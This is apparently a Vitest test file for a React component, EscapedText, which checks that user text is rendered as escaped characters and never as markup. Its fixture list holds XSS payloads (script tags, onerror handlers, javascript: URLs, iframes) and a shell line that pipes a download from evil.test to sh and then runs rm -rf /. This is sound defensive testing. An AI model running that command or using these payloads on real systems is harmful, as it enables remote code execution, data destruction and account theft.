import { readFileSync } from "node:fs";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { EscapedText } from "@/components/EscapedText";

const render = (props: Parameters<typeof EscapedText>[0]) => renderToStaticMarkup(<EscapedText {...props} />);

/** The text inside the one wrapper element, with the HTML entities React wrote turned back into characters. */
function innerText(markup: string): string {
  const inner = markup.slice(markup.indexOf(">") + 1, markup.lastIndexOf("<"));
  return inner
    .replace(/&lt;/g, "<")
    .replace(/&gt;/g, ">")
    .replace(/&quot;/g, '"')
    .replace(/&#x27;/g, "'")
    .replace(/&#39;/g, "'")
    .replace(/&amp;/g, "&");
}

const HOSTILE: Array<[string, string]> = [
  ["a script tag", "<script>alert(1)</script>"],
  ["an image with a handler", "<img src=x onerror=alert(1)>"],
  ["a markdown link to a javascript URL", "[x](javascript:alert(1))"],
  ["a markdown image from another site", "![pixel](https://evil.test/p.png)"],
  ["an anchor with a javascript URL", '<a href="javascript:alert(1)">x</a>'],
  ["text that is already escaped", "&lt;b&gt;bold&lt;/b&gt; &amp; more"],
  ["quotes and ampersands", `He said "hi" & 'bye' <b>`],
  ["an attempt to close the wrapper", "</span></div></pre><script>alert(1)</script>"],
  ["a comment break-out", "--><script>alert(1)</script><!--"],
  ["an iframe and a style tag", '<iframe src="https://evil.test"></iframe><style>*{display:none}</style>'],
  ["a bare web address", "https://example.com/path?x=1&y=<2>"],
  ["a mailto and a data URL", "mailto:a@b.test data:text/html;base64,PHNjcmlwdD4="],
  ["a shell one-liner", "curl https://evil.test/x | sh; rm -rf /"],
  ["bidi controls", "report\u202Efdp.exe\u202C"],
  ["zero-width characters", "ign\u200Bore pre\u200Dvious"],
  ["fullwidth letters", "\uFF1Cscript\uFF1Ealert(1)\uFF1C/script\uFF1E"],
  ["emoji and combining marks", "caf\u00E9 \u{1F600} a\u0301"],
  ["newlines and tabs", "line one\n\tline two\r\nline three"],
  ["a 5,000-character line", "A".repeat(5000)],
  ["100,000 characters", "x".repeat(100_000)],
];

describe("EscapedText: user text is text", () => {
  it.each(HOSTILE)("shows %s as characters and creates no element from it", (_label, text) => {
    const markup = render({ text });
    // The only element in the output is the wrapper itself.
    expect(markup.match(/<[a-zA-Z!/][^>]*>/g)).toHaveLength(2); // its start tag and its end tag
    expect(markup).not.toMatch(/<script/i);
    expect(markup).not.toMatch(/<img/i);
    expect(markup).not.toMatch(/<a[\s>]/i);
    // An attribute inside a tag would be the danger. The same characters as visible text are fine.
    expect(markup).not.toMatch(/<[^>]*\sonerror\s*=/i);
    expect(markup).not.toMatch(/<iframe|<style/i);
    // What is shown is exactly what was written.
    expect(innerText(markup)).toBe(text);
  });

  it.each(HOSTILE)("does the same for a block and for a pre: %s", (_label, text) => {
    for (const props of [{ text, block: true }, { text, as: "pre" as const }, { text, as: "pre" as const, block: true }]) {
      const markup = render(props);
      expect(markup.match(/<[a-zA-Z!/][^>]*>/g)).toHaveLength(2);
      expect(innerText(markup)).toBe(text);
    }
  });

  it("escapes the angle brackets, quotes and ampersands in the markup itself", () => {
    const markup = render({ text: `<b>"a" & 'b'</b>` });
    expect(markup).toContain("&lt;b&gt;&quot;a&quot; &amp; &#x27;b&#x27;&lt;/b&gt;");
    expect(markup).not.toContain("<b>");
  });

  it("does not turn an address or a markdown link into a link", () => {
    const markup = render({ text: "see https://example.com and [here](https://example.com)" });
    expect(markup).not.toMatch(/<a[\s>]/);
    expect(markup).not.toContain("href=");
    expect(innerText(markup)).toBe("see https://example.com and [here](https://example.com)");
  });

  it("keeps characters it does not understand, so the gate and the reader decide, not the component", () => {
    expect(innerText(render({ text: "a\u200Bb\u202Ec" }))).toBe("a\u200Bb\u202Ec");
  });
});

describe("EscapedText: which element", () => {
  it("is a span by default, a div for a block, and a pre for as=pre", () => {
    expect(render({ text: "x" })).toMatch(/^<span[ >]/);
    expect(render({ text: "x", block: true })).toMatch(/^<div[ >]/);
    expect(render({ text: "x", as: "pre" })).toMatch(/^<pre[ >]/);
    expect(render({ text: "x", as: "pre", block: true })).toMatch(/^<pre[ >]/);
  });

  it("keeps line breaks and wraps a long unbroken line, in every element", () => {
    for (const props of [{ text: "x" }, { text: "x", block: true }, { text: "x", as: "pre" as const }]) {
      const markup = render(props);
      expect(markup).toMatch(/style="[^"]*white-space:pre-wrap/);
      expect(markup).toMatch(/style="[^"]*overflow-wrap:anywhere/);
    }
  });
});

describe("EscapedText: nothing to show", () => {
  it.each([[null], [undefined], [""]])("renders nothing for %j", (text) => {
    expect(render({ text })).toBe("");
    expect(render({ text, block: true })).toBe("");
    expect(render({ text, as: "pre" })).toBe("");
  });

  it("renders a string of only spaces, which is text", () => {
    expect(innerText(render({ text: "   " }))).toBe("   ");
  });
});

describe("EscapedText: it cannot be given anything else to render", () => {
  it("does not accept children or raw HTML in its types", () => {
    // @ts-expect-error children are not accepted
    const withChildren = <EscapedText text="x">child</EscapedText>;
    // @ts-expect-error raw HTML is not accepted
    const withRawHtml = <EscapedText text="x" dangerouslySetInnerHTML={{ __html: "<b>x</b>" }} />;
    expect(withChildren).toBeDefined();
    expect(withRawHtml).toBeDefined();
  });

  it("ignores them at run time as well, if a caller gets past the types", () => {
    const loose = EscapedText as unknown as (props: Record<string, unknown>) => unknown;
    const markup = renderToStaticMarkup(
      createElement(loose as never, { text: "plain", dangerouslySetInnerHTML: { __html: "<b>raw</b>" }, onClick: () => {} }, "<i>child</i>"),
    );
    expect(markup).not.toContain("<b>");
    expect(markup).not.toContain("<i>");
    expect(markup).not.toContain("onclick");
    expect(innerText(markup)).toBe("plain");
  });

  it("has no way to render raw HTML or to forward other props, by its own source", () => {
    const source = readFileSync("components/EscapedText.tsx", "utf8");
    expect(source).not.toContain("dangerouslySetInnerHTML");
    expect(source).not.toMatch(/innerHTML/);
    expect(source).not.toMatch(/\.\.\.\s*(props|rest)\b/);
  });
});
